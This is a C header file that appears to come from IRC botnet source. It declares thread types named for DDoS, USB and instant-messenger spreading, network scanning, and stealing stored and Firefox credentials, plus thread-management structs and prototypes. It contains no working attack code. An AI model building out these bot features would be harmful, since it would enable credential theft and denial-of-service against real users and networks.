enum {
	MAIN_THREAD,
	LOG_THREAD,
	PROC_THREAD,
	LIST_THREAD,
	DDOS_THREAD,
	DOWNLOAD_THREAD,
	USB_THREAD,
	MSNMSG1_THREAD,
	MSNMSG2_THREAD,
	PSTORE_THREAD,
	YAHOOMSG_THREAD,
	YAHOO_THREAD,
	YAHOO2_THREAD,
	SCAN_THREAD,
	FIREFOX_THREAD,
};

typedef struct THREAD 
{
   char name[IRCLINE];
   int id; 
   int parent;
   DWORD pid;
   HANDLE tHandle;
   SOCKET csock;

} THREAD;

// default new thread structure
typedef struct NTHREAD {
	void *conn;
	char target[128];
	int  threadnum;
	
	char *data1;
	char *data2;
	char *data3;

	BOOL bdata1;
	BOOL bdata2;
	BOOL bdata3;

	int idata1;
	int idata2;

	SOCKET sock;
	SOCKET csock;

	BOOL verbose;
	BOOL silent;
	BOOL gotinfo;

} NTHREAD;

/*
typedef struct TLIST
{
	SOCKET sock;
	char chan[128];
	int threadnum;
	BOOL full;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;

} TLIST;
*/

int addthread(int id, char *name,...);
BOOL killthread(int threadnum);
int killthreadall(void);
int killthreadid(int threadid, int threadnum=0);
void clearthread(int threadnum);
DWORD WINAPI ListThread(LPVOID param);
void listthreads(char *target, void* conn, BOOL verbose, BOOL full);
void stopthread(char *target, void* conn, BOOL silent, BOOL verbose, char *thread, int threadid, char *desc);
int findthreadid(int threadid);
int findthreadnum(int threadid);

DWORD WINAPI ListThread(LPVOID param);
void listthreads(SOCKET sock, char *chan, BOOL notice, BOOL full=FALSE);
int findthreadid(int threadid);
void stopthread(SOCKET sock, char *chan, BOOL notice, BOOL silent, char *name, char *desc, int threadid, char *thread);
